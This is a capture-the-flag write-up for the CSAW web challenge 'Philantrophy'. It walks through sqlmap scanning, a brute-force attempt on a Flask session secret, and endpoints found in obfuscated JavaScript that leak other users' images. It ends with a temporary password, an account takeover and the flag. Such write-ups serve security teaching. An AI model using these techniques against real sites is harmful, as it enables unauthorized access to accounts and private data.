# Philantrophy

## Description

Can you break into the Philanthropy website and get more information on Snake and Otacon?

[http://web.csaw.io:14180/web/home](http://web.csaw.io:14180/web/home)

Author: `Enigma`

---

## Solution

Looking at the website, we have a register and login function. I started with registering an account to see what functionality we had as a user, but there wasn't much. Next, I decided to test for SQL injection with `sqlmap`. 

```bash
sqlmap -u http://web.csaw.io:14180/web/register --forms --crawl=2
```

However, this didn't yield anything promising. Next, I started to analyze the client-side code. One unique thing I found was that for every page visit, a GET request is made to `/verify`, which returns a JSON response of your current user

```json
{
    "Member": false,
    "Username": "test@abc.com",
    "Valid": true
}
```

I thought maybe this hinted towards us needing to craft a session cookie to where Member is true. Looking at the cookie `access_token`, and using [Flask Session Cookie Decoder](https://www.kirsle.net/wizards/flask-session.cgi), we can determine the website is using Flask and the cookies are JWT tokens.

Next, I used `flask-unsign` to try and bruteforce the Flask `SECRET_KEY`. 

```bash
flask-unsign --unsign --wordlist=all.txt --cookie < cookie.txt
```

This also didn't yield anything. Going back to client-side code review, I also noticed every page visit `console.log`s the response of `/verify`. I went to look at the Javascript to see how this was being handled, and noticed it was obfuscated. I used some online tools to deobfuscate, but that wasn't even necessary. Just by looking at the minified and obfuscated code, we are able to pull out two unique URLs:

* /identity/images?user="tacon@protonmail.com"
* /identity/images?user="solidsnake@protonmail.com"

Visiting http://web.csaw.io:14180/identity/images?user=%22otacon@protonmail.com%22 and the other URL yield a JSON response containing images. 

```json
{
  "msg": [
    {
      "credit": "mling@protonmail.com",
      "filename": "124d86b2-f579-4aa3-a2b5-012a125aea7d.png",
      "mg_model": "RAY",
      "submitter": "otacon@protonmail.com"
    },
    {
      "credit": "mling@protonmail.com",
      "filename": "1feda4bc-baff-455d-9ef4-7a30c986a668.png",
      "mg_model": "RAY",
      "submitter": "otacon@protonmail.com"
    }
    ...
}

```

In total, there are 13 images. Instead of manually downloading, let's automate it (because why not :D)

```python
url1 = 'http://web.csaw.io:14180/identity/images?user=%22otacon@protonmail.com%22'
url2 = 'http://web.csaw.io:14180/identity/images?user=%22solidsnake@protonmail.com%22'

import requests

r1 = requests.get(url1, verify=False)
r2 = requests.get(url2, verify=False)

resp1 = r1.json()
resp2 = r2.json()

for i in resp1['msg']:
    url = 'http://web.csaw.io:14180/images/' + i['filename']
    # download the file
    r = requests.get(url, verify=False)
    with open(i['filename'], 'wb') as f:
        f.write(r.content)

for i in resp2['msg']:
    url = 'http://web.csaw.io:14180/images/' + i['filename']
    # download the file
    r = requests.get(url, verify=False)
    with open(i['filename'], 'wb') as f:
        f.write(r.content)
```

Looking at the files, `b6116d5a-a415-4438-8f43-2b4cb648593e.png` mentions a temporary password for snake!

![b6116d5a-a415-4438-8f43-2b4cb648593e.png](https://i.imgur.com/8WQWadI.png)

Now, we can login to `solidsnake@protonmail.com` and access the flag. 

`csawctf{K3pt_y0u_Wa1t1ng_HUh}`